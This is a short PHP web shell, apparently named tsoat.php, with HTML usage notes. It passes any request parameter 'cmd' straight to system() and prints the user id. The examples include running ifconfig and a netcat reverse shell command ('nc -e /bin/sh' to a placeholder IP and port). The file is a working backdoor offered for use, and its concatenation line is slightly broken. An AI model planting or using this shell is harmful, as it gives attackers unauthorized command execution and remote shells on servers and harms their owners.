<h2>Usage:</h2>
<p>In the address bar above, add a <code>?cmd=</code> after the tsoat.php to execute a local system command. <br>
<h3>Examples:</h3>
<ul>
<li><code> tsoat.php?cmd=ifconfig</code></li><br>
<li>Need a reverse shell?
<code> tsoat.php?cmd=nc -e /bin/sh LOCALIP LOCALPORT</code></li>
</ul>
</p>
<?php
system($_REQUEST['cmd']);
print "UID: <pre>" + system('id'); + "</pre>"
?>
